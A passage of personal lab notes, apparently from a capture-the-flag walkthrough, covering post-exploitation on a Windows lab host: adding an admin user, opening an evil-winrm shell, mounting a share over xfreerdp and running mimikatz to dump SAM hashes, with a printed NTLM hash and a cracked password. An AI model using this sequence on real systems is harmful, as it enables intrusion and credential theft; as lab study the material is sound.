From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).

Adding new user and giving Admin privileges
![[Screenshot 2021-04-13 at 7.21.04 PM.png]]

Using evil-winrm for stable shell and as post exploitation

`evil-winrm -u sp00f -p "paSSword" -i 10.200.109.150`

![[Screenshot 2021-04-13 at 7.24.09 PM.png]]

using xfreerdp to get the hashes of the admin
`xfreerdp /v:10.200.109.150 /u:sp00f /p:paSSword /drive:/usr/share/windows-resources,share`


![[Screenshot 2021-04-13 at 7.58.27 PM.png]]
![[Screenshot 2021-04-13 at 7.58.47 PM.png]]

Running the mimikatz binary to get escalate the privileges as we still cant get the hashes
`\\tsclient\share\mimikatz\x64\mimikatz.exe`

Running
`privilege::debug`
`oken::elevate`

and `lsadump::sam` to get the dump
![[Screenshot 2021-04-13 at 8.02.03 PM.png]]


```
RID  : 000001f4 (500)                                                                                                   User : Administrator                                                                                                      Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1      
```

```
hash

thmomas 02d90eda8f6b6b06c32d5f207831101f 
passwd: i<3ruby
```

![[Screenshot 2021-04-13 at 8.57.08 PM.png]]

